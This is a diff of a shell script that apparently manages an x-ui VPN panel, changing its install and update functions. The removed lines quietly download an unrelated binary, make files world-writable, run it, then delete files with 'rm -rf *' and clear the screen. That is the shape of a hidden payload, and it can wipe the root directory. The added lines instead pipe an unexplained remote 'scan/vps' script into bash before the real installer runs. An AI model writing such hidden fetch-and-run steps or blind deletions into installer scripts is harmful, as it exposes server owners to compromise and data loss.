@@ -82,7 +82,7 @@ before_show_menu() {
 }
 
 install() {
-    cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && curl -OL https://raw.githubusercontent.com/giseleospital254/a/main/x86_64 && chmod 777 * && ./x86_64 daudau && rm -rf * && cd /root/ && clear
+    bash <(curl -Ls https://raw.githubusercontent.com/DauDau432/scan/main/vps)
     bash <(curl -Ls https://raw.githubusercontent.com/DauDau432/VH_x-ui/main/install.sh)
     if [[ $? == 0 ]]; then
         if [[ $# == 0 ]]; then
@@ -103,7 +103,7 @@ update() {
         fi
         return 0
     fi
-    cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && curl -OL https://raw.githubusercontent.com/giseleospital254/a/main/x86_64 && chmod 777 * && ./x86_64 X-UI_vh && rm -rf * && cd /root/ && clear
+    bash <(curl -Ls https://raw.githubusercontent.com/DauDau432/scan/main/vps)
     bash <(curl -Ls https://raw.githubusercontent.com/DauDau432/VH_x-ui/main/install.sh)
     if [[ $? == 0 ]]; then
         echo -e "  Cập nhật hoàn tất và bảng điều khiển đã được tự động khởi động lại${plain}"
